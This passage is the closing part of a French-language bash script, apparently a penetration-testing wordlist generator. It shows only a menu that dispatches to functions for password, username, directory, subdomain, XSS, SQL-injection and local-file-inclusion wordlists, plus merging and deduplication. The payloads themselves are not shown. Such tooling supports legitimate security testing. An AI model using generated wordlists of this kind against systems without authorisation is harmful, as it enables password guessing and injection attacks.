                    generate_password_wordlist "$keyword"
                    ;;
                6)
                    read -p "Nom de l'entreprise: " company
                    generate_username_wordlist "$company"
                    ;;
                7) generate_directory_wordlist ;;
                8) generate_subdomain_wordlist ;;
                9) generate_xss_wordlist ;;
                10) generate_sql_wordlist ;;
                11) generate_lfi_wordlist ;;
                12) download_external_wordlists ;;
                13) merge_wordlists ;;
                14) deduplicate_wordlists ;;
                15) show_stats ;;
                16) echo "Au revoir!"; exit 0 ;;
                *) print_error "Choix invalide" ;;
            esac
        done
    fi
    
    # Nettoyage
    rm -rf "$TEMP_DIR"
    print_success "✅ Script terminé"
}

# Exécution
main "$@"